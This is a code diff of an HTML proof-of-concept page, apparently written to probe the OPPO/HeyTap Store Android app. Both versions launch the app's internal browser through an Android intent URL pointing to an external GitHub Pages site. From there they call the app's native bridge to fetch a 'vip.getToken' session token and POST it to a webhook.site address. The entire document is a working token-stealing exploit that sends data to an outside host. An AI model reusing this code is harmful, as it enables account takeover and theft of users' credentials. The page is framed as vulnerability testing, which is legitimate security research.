@@ -2,42 +2,45 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>OPPO Store Exploit Proof</title>
+    <title>OPPO Store Security Test</title>
 </head>
-<body style="background-color: white; color: black;">
-    <script>
-        // IMMEDIATE ALERT: If you see this inside the OPPO Store app, the exploit is WORKING.
-        alert("EXPLOIT RUNNING INSIDE OPPO STORE");
+<body style="text-align: center; padding-top: 50px; font-family: sans-serif;">
+    <h1>Final Exploit Test</h1>
+    <p>If the app opens, the token will be sent to Webhook.</p>
 
+    <button onclick="launchExploit()" style="padding: 20px; background: #222; color: white; border-radius: 10px;">
+        Trigger App Browser
+    </button>
+
+    <script>
+        const myUrl = "https://pk009900.github.io/my-oppo-test/";
         const webhook = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
 
-        function leak_callback(data) {
-            fetch(webhook, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ status: "SUCCESS_ATO", data: data })
-            });
-            alert("TOKEN STOLEN: Check Webhook!");
-        }
-
-        window.onload = function() {
-            if (window.HeytapNativeApi) {
-                // The bridge is present, steal the token
-                window.HeytapNativeApi.invoke("vip.getToken", "leak_callback");
-            }
-        };
-
-        function trigger() {
-            const target = "https://pk009900.github.io/my-oppo-test/";
-            // This path (/web/index.html) is the standard entry for the internal browser
-            const intent = `intent://web/index.html?url=${target}#Intent;scheme=heytap;package=com.heytap.store;S.browser_fallback_url=${target};end`;
+        function launchExploit() {
+            // This format attempts to launch the 'com.heytap.store' browser directly
+            // by using a broad VIEW action on your URL.
+            const intent = `intent:${myUrl}#Intent;action=android.intent.action.VIEW;package=com.heytap.store;S.browser_fallback_url=${myUrl}?ignore=true;end`;
             window.location.href = intent;
         }
-    </script>
 
-    <h1 style="margin-top:100px;">OPPO Store Bypass</h1>
-    <button onclick="trigger()" style="padding: 30px; font-size: 20px; background: orange; color: white;">
-        CLICK TO RE-TRIGGER APP
-    </button>
+        // --- Execute only if INSIDE the app ---
+        window.onload = function() {
+            // Check for a query param to stop the loop
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('ignore')) return;
+
+            if (window.HeytapNativeApi) {
+                // If we are in the app, the bridge will exist. Capture the token.
+                window.HeytapNativeApi.invoke("vip.getToken", (data) => {
+                    fetch(webhook, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({ status: "VULNERABILITY_CONFIRMED", data: data })
+                    });
+                    alert("TOKEN CAPTURED!");
+                });
+            }
+        };
+    </script>
 </body>
 </html>
